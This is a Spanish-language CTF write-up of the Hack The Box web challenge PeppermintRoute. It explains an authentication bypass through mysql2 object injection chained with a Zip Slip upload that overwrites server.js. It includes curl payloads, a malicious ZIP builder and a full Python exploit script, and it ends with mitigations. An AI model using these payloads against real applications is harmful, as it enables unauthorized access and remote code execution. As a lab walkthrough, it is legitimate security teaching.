# PeppermintRoute CTF Writeup

**Categoría:** Web  
**Dificultad:** Medium  
**Flag:** `HTB{wh0_l0v3_un53en_5ql_1nj3ct10n_z1psl1p_4nd_unh4ndl3d_3xc4pt10n?_52ca3524250b3cee0dd34b98ea9def31}`

---

## Resumen

PeppermintRoute es una aplicación de gestión de rutas navideñas construida con Node.js/Express. La explotación requiere encadenar dos vulnerabilidades:

1. **Object Injection en MySQL2** → Authentication Bypass
2. **Zip Slip (Path Traversal)** → Remote Code Execution

---

## Análisis del Stack

```
├── Node.js + Express 5.2.1
├── MySQL con mysql2 3.15.3
├── body-parser 2.2.1 (extended: true)
├── Multer 2.0.2 para uploads
├── Nginx como reverse proxy
└── Supervisor para gestión de procesos
```

---

## Vulnerabilidad 1: Object Injection (Auth Bypass)

### Ubicación
`app/controllers/authController.js:8-24`

```javascript
exports.postLogin = async (req, res) => {
    const { username, password } = req.body;
    const results = await query(
        'SELECT * FROM users WHERE username = ? AND password = ?',
        [username, password]
    );
    // ...
};
```

### Causa Raíz
- `body-parser` configurado con `extended: true` (en `server.js:11`)
- El driver `mysql2` serializa objetos de forma insegura

### Explotación

Cuando enviamos:
```
username[username]=1&password[password]=1
```

body-parser lo convierte en:
```javascript
{ username: { username: '1' }, password: { password: '1' } }
```

mysql2 serializa objetos como `` `campo` = 'valor' ``, resultando en:
```sql
SELECT * FROM users WHERE username = `username` = '1' AND password = `password` = '1'
-- Equivale a: WHERE 1=1 AND 1=1 (siempre TRUE)
```

Esto retorna el primer usuario de la tabla (el administrador).

### Variante: Login como cualquier piloto

También podemos autenticarnos como cualquier usuario específico:
```
username=pilot_aurora_xxx&password[password]=1
```

Esto resulta en:
```sql
WHERE username = 'pilot_aurora_xxx' AND password = `password` = '1'
-- El password siempre es TRUE, solo necesitamos el username correcto
```

---

## Vulnerabilidad 2: Zip Slip (Path Traversal)

### Ubicación
`app/utils/zipParser.js:70-109`

```javascript
extractAll(destDir) {
    for (const entry of entries) {
        // Validación insuficiente
        const parts = entry.fileName.split('/').filter(p => p);
        if (parts.length > 4) continue;  // Rechaza >4 partes

        const fullPath = path.join(destDir, entry.fileName);
        fs.writeFileSync(fullPath, content);  // Escritura sin validar
    }
}
```

### Causa Raíz
- El parser ZIP personalizado no valida secuencias `../` 
- Solo cuenta la cantidad de "partes" del path (máximo 4)
- `path.join()` resuelve los `..` permitiendo escapar del directorio

### Análisis del Path

Directorio de upload: `/app/data/uploads/<uuid>/`

| Path en ZIP | Partes | Destino |
|-------------|--------|---------|
| `../../../server.js` | 4 ✅ | `/app/server.js` |
| `../../../public/js/x.js` | 6 ❌ | Bloqueado |

---

## Cadena de Explotación Completa

### Paso 1: Authentication Bypass
```bash
curl -X POST "http://TARGET/login" \
  -d 'username[username]=1&password[password]=1' \
  -c cookies.txt
```

### Paso 2: Obtener un Recipient válido
```bash
curl -b cookies.txt "http://TARGET/api/admin/recipients-data"
# Respuesta: {"recipients":[{"recipient_name":"clarion",...}]}
```

### Paso 3: Crear ZIP malicioso con Zip Slip
```python
import zipfile
import io

payload = '''
const express = require('express');
const { execSync } = require('child_process');
const app = express();

app.get('/flag', (req, res) => {
    const flag = execSync('/readflag').toString();
    res.send('<h1>FLAG: ' + flag + '</h1>');
});

app.get('/', (req, res) => {
    res.send('<h1>PWNED!</h1><a href="/flag">/flag</a>');
});

app.listen(3000, '127.0.0.1');
'''

zip_buffer = io.BytesIO()
with zipfile.ZipFile(zip_buffer, "w") as zf:
    zf.writestr("../../../server.js", payload)
```

### Paso 4: Subir el ZIP
```bash
curl -b cookies.txt \
  -F "files=@exploit.zip" \
  "http:SECRET_REDACTED_BY_ANTIGRAVITY"
```

### Paso 5: Esperar reinicio del servidor
El servidor de HTB reinicia periódicamente (~10-15 min). Cuando Node.js reinicia, carga nuestro `server.js` malicioso.

### Paso 6: Obtener la flag
```bash
curl "http://TARGET/flag"
# <h1>FLAG: HTB{wh0_l0v3_un53en_5ql_1nj3ct10n_z1psl1p_4nd_unh4ndl3d_3xc4pt10n?_...}</h1>
```

---

## Exploit Completo

```python
#!/usr/bin/env python3
import httpx
import zipfile
import io
import re
import time
import sys

TARGET = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:1337"

# Payload para server.js
PAYLOAD = '''
const express = require('express');
const { execSync } = require('child_process');
const app = express();

app.get('/flag', (req, res) => {
    const flag = execSync('/readflag').toString().trim();
    res.send('<h1>FLAG: ' + flag + '</h1>');
});

app.get('/', (req, res) => {
    res.send('<h1>PWNED!</h1><a href="/flag">/flag</a>');
});

app.listen(3000, '127.0.0.1');
'''

def exploit():
    client = httpx.Client(base_url=TARGET, timeout=30, follow_redirects=False)
    
    # 1. Auth bypass
    print("[*] Auth bypass...")
    r = client.post("/login", data={
        "username[username]": "1",
        "password[password]": "1"
    })
    assert r.status_code == 302, "Auth bypass failed"
    print("[+] Logged in as admin")
    
    # 2. Get recipient
    r = client.get("/api/admin/recipients-data")
    recipient = r.json()['recipients'][0]['recipient_name']
    print(f"[+] Using recipient: {recipient}")
    
    # 3. Create malicious ZIP
    zip_buf = io.BytesIO()
    with zipfile.ZipFile(zip_buf, "w") as zf:
        zf.writestr("../../../server.js", PAYLOAD)
    
    # 4. Upload
    files = {"files": ("exploit.zip", zip_buf.getvalue(), "application/zip")}
    r = client.post(f"/admin/recipients/{recipient}/upload", files=files)
    print("[+] Payload uploaded!")
    
    # 5. Monitor for restart
    print("[*] Waiting for server restart...")
    while True:
        try:
            r = client.get("/flag")
            if "HTB{" in r.text:
                flag = re.search(r'HTB\{[^}]+\}', r.text).group()
                print(f"\n[+] FLAG: {flag}")
                return
        except:
            pass
        time.sleep(10)

if __name__ == "__main__":
    exploit()
```

---

## Mitigaciones

### Object Injection
```javascript
// Usar extended: false en body-parser
app.use(bodyParser.urlencoded({ extended: false }));

// O validar tipos de entrada
if (typeof username !== 'string' || typeof password !== 'string') {
    return res.status(400).send('Invalid input');
}
```

### Zip Slip
```javascript
// Validar que el path resuelto esté dentro del directorio destino
const fullPath = path.resolve(destDir, entry.fileName);
if (!fullPath.startsWith(path.resolve(destDir) + path.sep)) {
    throw new Error('Path traversal detected');
}
```

---

## Notas Adicionales

- El flag menciona las vulnerabilidades: **unseen SQL injection** (Object Injection), **zipslip**, y **unhandled exception** (el reinicio necesario)
- La validación de 4 partes en el path limita qué archivos se pueden sobrescribir
- Solo `/app/server.js`, `/app/init-db.js` y `/app/package.json` son accesibles
- El reinicio del contenedor completo restaura la imagen, por lo que solo funciona si reinicia el proceso Node.js
